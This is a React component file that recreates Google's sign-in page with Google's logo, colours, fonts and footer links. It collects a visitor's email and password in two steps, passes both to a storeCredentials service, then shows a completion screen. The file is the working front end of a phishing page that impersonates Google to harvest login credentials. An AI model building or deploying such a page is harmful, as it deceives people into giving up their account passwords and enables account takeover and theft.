import React, { useState } from 'react';
import { withStyles, createStyles } from '@material-ui/core';
import Grid from '@material-ui/core/Grid';
import Card from '@material-ui/core/Card';
import TextField from '@material-ui/core/TextField';
import Button from '@material-ui/core/Button';
import { makeStyles } from '@material-ui/styles';
import 'typeface-roboto';
import logo from '../../assets/google.png'
import EmailComponent from './EmailComponent';
import PasswordComponent from './PasswordComponent';
import CompleteComponent from './CompleteComponent';
import {storeCredentials} from '../../services/services';

const useStyles = makeStyles({
    outer: {
        height: 540,
        width: 450,
        fontFamily: 'roboto',
        fontWeight: 400
    },
    card: {
        width: '100%',
        height: 500,
        padding: "48px 40px 36px 40px"
    },
    grid: {
        height: '100vh'
    },
    tail: {
        marginTop: 10,
        color: '#757575'
    },
    tailLeft: {
        display: 'inline',
        color: '#202124',
        fontSize: '12px',
        verticalAlign: 'bottom'
    },
    tailRight: {
        float: "right",
        fontSize: '12px',
        fontWeight: 700
    },
    a: {
        textDecoration: 'none',
        color: '#757575'
    },
    textField: {
        width: '100%',
    },
    logo: {
        display: "block",
        marginLeft: 'auto',
        marginRight: 'auto',
        width: 95,
        height: 40
    },
    button: {
        float: "right",
        background: "#1a73e8",
    },
    buttonLabel: {
        color: "#FFFFFF"
    },
    signin: {
        fontSize: 24
    },
    signinText: {
        textAlign: "center",
        padding: "25px"
    },
    blueLinks: {
        color: '#1a73e8',
        textDecoration: 'none',
        fontWeight: 600,
        fontSize: '14px'
    }
})

function Component() {
    const [emailState, setEmailState] = useState("email");
    const [email, setEmail] = useState("");
    const [password, setPassword] = useState("");

    const classes = useStyles();

    function toggleState() {
        if (emailState === "email" && email !== "") {
            setEmailState("password");
        } else {
            setEmailState("email");
        }
    }

    function completeEmail() {
        storeCredentials(email, password);
        setEmailState("complete");
    }


    function getComponent(emailState) {
        switch (emailState) {
            case "email": return <EmailComponent email={email} next={() => toggleState()} setEmail={(e) => setEmail(e.target.value)} />
            case "password": return <PasswordComponent back={() => toggleState()} setPassword={(e) => setPassword(e.target.value)} email={email} onComplete={()=> completeEmail()} />
            case "complete": return <CompleteComponent />
            default: return ""
        }
    }

    return (
        <Grid
            container
            direction="row"
            justify="center"
            alignItems="center"
            className={classes.grid}
        >
            <div className={classes.outer}>
                <Card className={classes.card}>

                    <img className={classes.logo} src={logo} />
                    {getComponent(emailState)}
                </Card>
                <Grid container spacing={3} alignItems="flex-end" className={classes.tail}>
                    <Grid item xs={6} className={classes.tailLeft}>English (United States)</Grid>
                    <Grid item xs={6}>
                        <Grid container spacing={3} justify='flex-end' className={classes.tailRight}>
                            <Grid item xs={4}><a href='#' className={classes.a}>Help</a></Grid>
                            <Grid item xs={4}><a href='#' className={classes.a}>Privacy</a></Grid>
                            <Grid item xs={4}><a href='#' className={classes.a}>Terms</a></Grid>
                        </Grid>
                    </Grid>
                </Grid>
            </div>
        </Grid>
    )
}


export default Component;